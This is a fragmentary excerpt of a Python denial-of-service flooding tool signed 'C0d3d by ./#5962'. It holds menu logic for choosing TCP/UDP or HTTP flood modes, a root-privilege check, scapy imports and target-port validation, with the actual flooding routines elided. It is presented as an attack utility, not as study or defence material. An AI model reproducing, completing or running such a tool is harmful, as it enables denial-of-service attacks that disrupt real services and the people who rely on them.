...
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # C0d3d by ./#5962

if sys.platform.startswith("linux"): # C0d3d by ./#5962
	from scapy.all import * # C0d3d by ./#5962
elif sys.platform.startswith("freebsd"): # C0d3d by ./#5962
	from scapy.all import * # C0d3d by ./#5962
else: # C0d3d by ./#5962
	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # C0d3d by ./#5962
...
def floodmode():
	...
	if choice1 == "0":
		...
		try:
			if os.getuid() != 0: # C0d3d by ./#5962
				print("You need to run this program as root to use TCP/UDP flooding.") # C0d3d by ./#5962
				exit(0) # C0d3d by ./#5962
			else: # C0d3d by ./#5962
				floodport() # C0d3d by ./#5962
		except:
			pass
	elif choice1 == "2":
		try:
...
def floodport():
	...
	try:
		...
		portlist = range(65535) # C0d3d by ./#5962
		if port in portlist: # C0d3d by ./#5962
			pass # C0d3d by ./#5962
		else: # C0d3d by ./#5962
			print ("You mistyped, try again.")
			floodport() # C0d3d by ./#5962
	except ValueError: # C0d3d by ./#5962
		print ("You mistyped, try again.") # C0d3d by ./#5962
		floodport() # C0d3d by ./#5962
	proxymode()
